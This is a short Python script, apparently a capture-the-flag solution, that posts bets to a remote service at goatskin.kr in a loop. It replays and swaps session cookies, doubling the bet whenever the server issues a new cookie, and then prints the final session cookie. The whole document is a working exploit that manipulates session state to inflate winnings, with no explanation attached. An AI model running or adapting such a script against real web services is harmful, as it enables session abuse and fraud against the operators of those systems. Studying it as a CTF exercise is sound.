import requests

i = 100
first_cookie = '3dbba0a4a0d14f644c529fa7a7b44ff58ae6354233b40903d6096a59d7bc2b82'
cookie = '3dbba0a4a0d14f644c529fa7a7b44ff58ae6354233b40903d6096a59d7bc2b82'

while i < 1000000000000000 :
    field = {'bet' : i, 'choice' : 1 }
    cookies = {'sess' : cookie }
    r = requests.post("http://remote.goatskin.kr:5011", data = field, cookies = cookies)
    if r.cookies['sess'] != cookie and r.cookies['sess'] != first_cookie : 
        i = i*2
        cookie = r.cookies['sess']
        print(i)

print(cookie)
